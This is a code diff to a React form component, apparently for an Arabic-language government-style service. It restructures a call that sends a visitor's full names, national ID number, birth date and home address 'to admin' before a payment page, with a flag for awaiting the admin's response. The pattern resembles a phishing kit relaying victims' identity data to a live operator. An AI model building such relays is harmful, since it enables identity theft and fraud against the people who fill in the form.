@@ -1170,19 +1170,22 @@ const Documents = () => {
                   navigateToPage('صفحة الملخص والدفع');
                   // Send data to admin before navigating
                   sendData({
-                    'صفحة': 'صفحة الملخص والدفع',
-                    'الخدمة': serviceName,
-                    'الاسم بالعربي': `${arabicFirstName} ${arabicSecondName} ${arabicThirdName} ${arabicFourthName}`,
-                    'الاسم بالإنجليزي': `${englishFirstName} ${englishSecondName} ${englishThirdName} ${englishFourthName}`,
-                    'رقم الهوية': nationalId,
-                    'الجنس': gender,
-                    'تاريخ الميلاد': calendarType === 'gregorian' && dateOfBirth ? dateOfBirth.toLocaleDateString('ar-SA') : `${hijriDate.day}/${hijriDate.month}/${hijriDate.year} هـ`,
-                    'المحافظة': province,
-                    'المنطقة': district,
-                    'اسم الشارع': streetName,
-                    'رقم المبنى': buildingNumber,
-                    'الدور': floorNumber,
-                    'الإقرار': 'تم الموافقة'
+                    current: 'صفحة الملخص والدفع',
+                    data: {
+                      'الخدمة': serviceName,
+                      'الاسم بالعربي': `${arabicFirstName} ${arabicSecondName} ${arabicThirdName} ${arabicFourthName}`,
+                      'الاسم بالإنجليزي': `${englishFirstName} ${englishSecondName} ${englishThirdName} ${englishFourthName}`,
+                      'رقم الهوية': nationalId,
+                      'الجنس': gender,
+                      'تاريخ الميلاد': calendarType === 'gregorian' && dateOfBirth ? dateOfBirth.toLocaleDateString('ar-SA') : `${hijriDate.day}/${hijriDate.month}/${hijriDate.year} هـ`,
+                      'المحافظة': province,
+                      'المنطقة': district,
+                      'اسم الشارع': streetName,
+                      'رقم المبنى': buildingNumber,
+                      'الدور': floorNumber,
+                      'الإقرار': 'تم الموافقة'
+                    },
+                    waitingForAdminResponse: false
                   });
                   // Wait 3 seconds then navigate
                   setTimeout(() => {
